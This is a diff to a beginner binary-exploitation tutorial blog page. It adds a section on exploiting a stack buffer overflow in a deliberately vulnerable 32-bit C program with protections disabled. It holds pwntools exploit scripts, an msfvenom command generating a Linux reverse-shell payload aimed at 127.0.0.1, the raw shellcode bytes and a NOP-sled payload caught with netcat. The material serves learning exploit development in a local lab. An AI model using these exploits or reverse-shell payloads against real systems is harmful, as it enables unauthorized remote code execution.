@@ -73,8 +73,8 @@
   "keywords": [
     "pwn", "binary", "memory", "x32", "x64", "gdb", "memory corruption", "binary exploitation", "exploit development"
   ],
-  "articleBody": "In this post, we will see what is a buffer overflow and will exploit it to get code execution. Do Not feel overwhelmed. Just follow along and we’ll have fun.\nIf you are new to the series, check out my previous posts here\nThe Stack Take this C program:\n    program.c  #include #include  int helper(){ system(\"/bin/sh\"); // executes system shell } int overflow(){ char buffer[500]; // declaring buffer variable with specified size  int userinput; userinput = read(0, buffer, 700); // reading user input into buffer variable  printf(\"\\nUser provided %d bytes. Buffer content is: %s\\n\", userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; }    If we break down the program from the main function, it calls the overflow function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.\nAfter compiling, here’s what the program does:     Terminal    We have to compile the program with the following command:     Terminal  gcc -m32 -fno-stack-protector -z execstack program.c -o program    Also, we need to disable ASLR with the following command:     Terminal  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    Everytime you reboot your machine, you’ll have to do this step again.\nWhat's going on?  Modern programs come with a bunch of exploit mitigations. For example, we can see the protections on the ping binary which is mostly present on linux as well as windows, with checksec script.     Terminal      So, initially we’ll be working with those protections disabled and that is why we’re giving those extra flags to gcc.\nHere we can see the protections on our (compiled) program:     Terminal      For now, you don’t need to care about them. We’ll learn to bypass some anti-exploit mechanisms later on.\n \nIn general, the stack is aligned this way: Since our program is not dealing with any arguments, so, in our case, it’s like this: Stack Abuse What if we give the program some unexpected input? What if we give an input, more in magnitude than the defined buffer is supposed to handle? 🤔\nLet’s take a look.\nWhen we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.\nOur goal is to overwrite the return address of the function so that we can point the EIP to a memory address of our own choice. Normally, one can just get creative and give a program random inputs until something desirable is received back :)\nDeep Dive Let’s give our program some random inputs, with the help of Python.\n(You know we can pipe the output of one command to another, right?)\n    Terminal    Hnmm.. so, eventually, we broke the program!\nLet’s generate a pattern with cyclic utility and analyse the program with gdb to determine the offset of EIP.\nAlternative One can also use metasploit’s msf-pattern_create and msf-pattern_offset to achieve the same result.\n\n    Terminal    We get the offset to be 516.\nNow, we will send calculated input to see if we can control the EIP.\n    Terminal    And.. Yes! We can see 0x42424242, the hex code for the 4 B’s we sent.\nEIP Control When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.\nDead Code is a piece of code within a program which is not used when the program executes.\nCode Reuse We can see that the helper function isn’t called during the program execution. Since we have control over the EIP, we can point it to the helper function to get it executed.\nFor that purpose, we need the memory address of the helper function. We can find it with gdb as:\n    Terminal    Our binary is 32-bit and 32-bit programs use little-endian, due to which we have to provide the memory address in reverse bytes order.\n    Terminal    But.. we still get segmentation fault.\nNo need to worry. This is a common thing in exploit dev. Let’s arrange the bytes a bit and see what happens.\n    Terminal    Yay! Did you see? a new process /usr/bin/dash started.. Our Shell!\nBut, wait.. it also did exit even before we could interact with it.\nWhat happens under the hood is that a child process dash is started which operates by getting input from user (like bash or sh) but the parent process (our program) is done with its job and exits. The child process with no input, consequently, also exits.\nWe can take help of cat command to make the terminal wait for input.\nBut, for convenience, we are going to use an awesome tool, a python library, pwntools to make our exploitation process easy.\nPwntools\nHere’s a nice little exploit:\n    vim - exploit.py  1 2 3 4 5 6 7 8 9 10 11  #!/bin/python3 from pwn import * exe = './program' elf = context.binary = ELF(exe, checksec=False) payload=flat(\"A\"*516,0x565561b9) io = process(exe) io.sendline(payload) io.interactive()     Upon running the exploit, we successfully get a system shell and can execute arbitrary commands 🔥\n    Terminal    Shellcode ",
-  "wordCount" : "843",
+  "articleBody": "In this post, we will see what is a buffer overflow and will exploit it to get code execution. Do Not feel overwhelmed. Just follow along and we’ll have fun.\nIf you are new to the series, check out my previous posts here\nThe Stack Take this C program:\n    program.c  #include #include  int helper(){ system(\"/bin/sh\"); // executes system shell } int overflow(){ char buffer[500]; // declaring buffer variable with specified size  int userinput; userinput = read(0, buffer, 700); // reading user input into buffer variable  printf(\"\\nUser provided %d bytes. Buffer content is: %s\\n\", userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; }    If we break down the program from the main function, it calls the overflow function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.\nAfter compiling, here’s what the program does:     Terminal    We have to compile the program with the following command:     Terminal  gcc -m32 -fno-stack-protector -z execstack program.c -o program    Also, we need to disable ASLR with the following command:     Terminal  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    Everytime you reboot your machine, you’ll have to do this step again.\nWhat's going on?  Modern programs come with a bunch of exploit mitigations. For example, we can see the protections on the ping binary which is mostly present on linux as well as windows, with checksec script.     Terminal      So, initially we’ll be working with those protections disabled and that is why we’re giving those extra flags to gcc.\nHere we can see the protections on our (compiled) program:     Terminal      For now, you don’t need to care about them. We’ll learn to bypass some anti-exploit mechanisms later on.\n \nIn general, the stack is aligned this way: Since our program is not dealing with any arguments, so, in our case, it’s like this: Stack Abuse What if we give the program some unexpected input? What if we give an input, more in magnitude than the defined buffer is supposed to handle? 🤔\nLet’s take a look.\nWhen we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.\nOur goal is to overwrite the return address of the function so that we can point the EIP to a memory address of our own choice. Normally, one can just get creative and give a program random inputs until something desirable is received back :)\nDeep Dive Let’s give our program some random inputs, with the help of Python.\n(You know we can pipe the output of one command to another, right?)\n    Terminal    Hnmm.. so, eventually, we broke the program!\nLet’s generate a pattern with cyclic utility and analyse the program with gdb to determine the offset of EIP.\nAlternative One can also use metasploit’s msf-pattern_create and msf-pattern_offset to achieve the same result.\n\n    Terminal    We get the offset to be 516.\nNow, we will send calculated input to see if we can control the EIP.\n    Terminal    And.. Yes! We can see 0x42424242, the hex code for the 4 B’s we sent.\nEIP Control When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.\nDead Code is a piece of code within a program which is not used when the program executes.\nCode Reuse We can see that the helper function isn’t called during the program execution. Since we have control over the EIP, we can point it to the helper function to get it executed.\nFor that purpose, we need the memory address of the helper function. We can find it with gdb as:\n    Terminal    Our binary is 32-bit and 32-bit programs use little-endian, due to which we have to provide the memory address in reverse bytes order.\n    Terminal    But.. we still get segmentation fault.\nNo need to worry. This is a common thing in exploit dev. Let’s arrange the bytes a bit and see what happens.\n    Terminal    Yay! Did you see? a new process /usr/bin/dash started.. Our Shell!\nBut, wait.. it also did exit even before we could interact with it.\nWhat happens under the hood is that a child process dash is started which operates by getting input from user (like bash or sh) but the parent process (our program) is done with its job and exits. The child process with no input, consequently, also exits.\nWe can take help of cat command to make the terminal wait for input.\nBut, for convenience, we are going to use an awesome tool, a python library, pwntools to make our exploitation process easy.\nPwntools\nHere’s a nice little exploit:\n    vim - exploit.py  1 2 3 4 5 6 7 8 9 10  #!/bin/python3 from pwn import * exe = './program' payload=flat(\"A\"*516,0x565561b9) io = process(exe) io.sendline(payload) io.interactive()     Upon running the exploit, we successfully get a system shell and can execute arbitrary commands 🔥\n    Terminal    Shellcode The helper function made the exploitation very easy for us this time but, normally, we don’t have such a luxury very often. Then what are we supposed to do?\nWell, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.\nFor now, we are going to use msfvenom, an automated tool to generate the shellcode for us with this command:     Terminal  msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1236 -b \"\\x00\" -f py        Terminal    We will use gdb and take note of the memory address from where our buffer starts.     Terminal    We’re giving dumb input (just A’s) so that we can easily see our buffer.     Terminal    We can see that our buffer is starting on the second line. Keep note of the memory address 0xffffcc18.\nExploitation Let’s prepare our exploit:     exploit.py  #!/bin/python3 from pwn import * exe = './program' elf = context.binary = ELF(exe, checksec=False) buf = b\"\" buf += b\"\\xbf\\x48\\x8a\\xd9\\x40\\xd9\\xec\\xd9\\x74\\x24\\xf4\\x5e\\x29\" buf += b\"\\xc9\\xb1\\x12\\x83\\xc6\\x04\\x31\\x7e\\x0e\\x03\\x36\\x84\\x3b\" buf += b\"\\xb5\\xf7\\x43\\x4c\\xd5\\xa4\\x30\\xe0\\x70\\x48\\x3e\\xe7\\x35\" buf += b\"\\x2a\\x8d\\x68\\xa6\\xeb\\xbd\\x56\\x04\\x8b\\xf7\\xd1\\x6f\\xe3\" buf += b\"\\x78\\x22\\x90\\xf2\\xee\\x20\\x90\\xf0\\x3a\\xad\\x71\\x48\\xa4\" buf += b\"\\xfe\\x20\\xfb\\x9a\\xfc\\x4b\\x1a\\x11\\x82\\x1e\\xb4\\xc4\\xac\" buf += b\"\\xed\\x2c\\x71\\x9c\\x3e\\xce\\xe8\\x6b\\xa3\\x5c\\xb8\\xe2\\xc5\" buf += b\"\\xd0\\x35\\x38\\x85\" payload=flat(\"\\x90\"*16,buf,\"A\"*(500-len(buf)),0xffffcc18) write(\"payload\",payload)    We have inserted a NOP slide (\\x90) in the payload before the shell code.\nA NOP instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won’t let our (noted) memory address go useless.\nLet’s run the exploit to get our payload.\nWe run the program with a breakpoint set and can see what’s there on the stack:     Terminal        Terminal    Let’s setup netcat listener in another terminal.     Terminal     Now, let’s continue:     Terminal    Gdb is telling us that a new program is launched.\nOn switching to our second terminal, the one with listener.. we can see:     Terminal     Vola! We got our reverse shell 🔥 😎\n",
+  "wordCount" : "1137",
   "inLanguage": "en",
   "image":"https://the-root-user.github.io/blog/images/cover-binexp-01.png","datePublished": "2022-07-18T00:00:00Z",
   "dateModified": "2022-07-18T00:00:00Z",
@@ -151,7 +151,7 @@
     <h1 class="post-title">
       Pwn 0x01: Buffer Overflow
     </h1>
-    <div class="post-meta"><span title='2022-07-18 00:00:00 +0000 UTC'>July 18, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Signore
+    <div class="post-meta"><span title='2022-07-18 00:00:00 +0000 UTC'>July 18, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Signore
 
 </div>
   </header> <div class="toc">
@@ -173,7 +173,11 @@
         <li><a href="#code-reuse">Code Reuse</a></li>
       </ul>
     </li>
-    <li><a href="#shellcode">Shellcode</a></li>
+    <li><a href="#shellcode">Shellcode</a>
+      <ul>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
         </div>
@@ -499,14 +503,12 @@ But, for convenience, we are going to use an awesome tool, a python library, <co
 </span><span class="lnt"> 8
 </span><span class="lnt"> 9
 </span><span class="lnt">10
-</span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/bin/python3</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./program&#39;</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
 
 <span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">516</span><span class="p">,</span><span class="mh">0x565561b9</span><span class="p">)</span>
 
@@ -539,6 +541,215 @@ But, for convenience, we are going to use an awesome tool, a python library, <co
 </div>
 
 <h2 id="shellcode">Shellcode<a hidden class="anchor" aria-hidden="true" href="#shellcode">#</a></h2>
+<p>The <code>helper</code> function made the exploitation very easy for us this time but, normally, we don&rsquo;t have such a luxury very often. Then what are we supposed to do?</p>
+<p>Well, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.</p>
+<p><img loading="lazy" src="memory-layout-shellcode.png" alt=""  />
+</p>
+<p>For now, we are going to use <code>msfvenom</code>, an automated tool to generate the shellcode for us with this command:
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div class="terminalbody">
+        <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>127.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">1236</span> -b <span class="s2">&#34;\x00&#34;</span> -f py
+</code></pre></div>
+    </div>
+</div>
+
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div class="terminalbody">
+        <img src="msfvenom.png" alt="">
+    </div>
+</div>
+</p>
+<p>We will use gdb and take note of the memory address from where our buffer starts.
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div class="terminalbody">
+        <img src="stack-before1.png" alt="">
+    </div>
+</div>
+</p>
+<p>We&rsquo;re giving dumb input (just A&rsquo;s) so that we can easily see our buffer.
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div class="terminalbody">
+        <img src="stack-before2.png" alt="">
+    </div>
+</div>
+</p>
+<p>We can see that our buffer is starting on the second line. Keep note of the memory address <code>0xffffcc18</code>.</p>
+<h3 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h3>
+<p>Let&rsquo;s prepare our exploit:
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">exploit.py</div>
+    </div>
+    <div class="terminalbody">
+        <div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/bin/python3</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./program&#39;</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbf\x48\x8a\xd9\x40\xd9\xec\xd9\x74\x24\xf4\x5e\x29</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x12\x83\xc6\x04\x31\x7e\x0e\x03\x36\x84\x3b</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb5\xf7\x43\x4c\xd5\xa4\x30\xe0\x70\x48\x3e\xe7\x35</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2a\x8d\x68\xa6\xeb\xbd\x56\x04\x8b\xf7\xd1\x6f\xe3</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x78\x22\x90\xf2\xee\x20\x90\xf0\x3a\xad\x71\x48\xa4</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfe\x20\xfb\x9a\xfc\x4b\x1a\x11\x82\x1e\xb4\xc4\xac</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xed\x2c\x71\x9c\x3e\xce\xe8\x6b\xa3\x5c\xb8\xe2\xc5</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd0\x35\x38\x85</span><span class="s2">&#34;</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">500</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)),</span><span class="mh">0xffffcc18</span><span class="p">)</span>
+
+<span class="n">write</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+    </div>
+</div>
+</p>
+<p>We have inserted a NOP slide (<code>\x90</code>) in the payload before the shell code.</p>
+<p>A NOP instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won&rsquo;t let our (noted) memory address go useless.</p>
+<p>Let&rsquo;s run the exploit to get our <code>payload</code>.</p>
+<p>We run the program with a breakpoint set and can see what&rsquo;s there on the stack:
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div class="terminalbody">
+        <img src="run-exploit.png" alt="">
+    </div>
+</div>
+
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div class="terminalbody">
+        <img src="stack-after.png" alt="">
+    </div>
+</div>
+</p>
+<p>Let&rsquo;s setup <code>netcat</code> listener in another terminal.
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal &lt;2&gt;</div>
+    </div>
+    <div class="terminalbody">
+        <img src="netcat1.png" alt="">
+    </div>
+</div>
+</p>
+<p>Now, let&rsquo;s <code>continue</code>:
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div class="terminalbody">
+        <img src="run-final.png" alt="">
+    </div>
+</div>
+</p>
+<p>Gdb is telling us that a new program is launched.</p>
+<p>On switching to our second terminal, the one with listener.. we can see:
+
+
+
+<div class="terminal space shadow">
+    <div class="top">
+        <div class="btns">
+            <span class="circle red"></span>
+            <span class="circle yellow"></span>
+            <span class="circle green"></span>
+        </div>
+        <div class="title">Terminal &lt;2&gt;</div>
+    </div>
+    <div class="terminalbody">
+        <img src="netcat2.png" alt="">
+    </div>
+</div>
+</p>
+<p>Vola! We got our reverse shell 🔥 😎</p>
 
 
   </div>
